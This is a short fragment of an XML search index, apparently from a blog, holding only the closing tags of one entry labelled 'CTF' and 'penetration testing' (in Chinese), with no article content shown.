    <tags>
      
      <tag>CTF</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
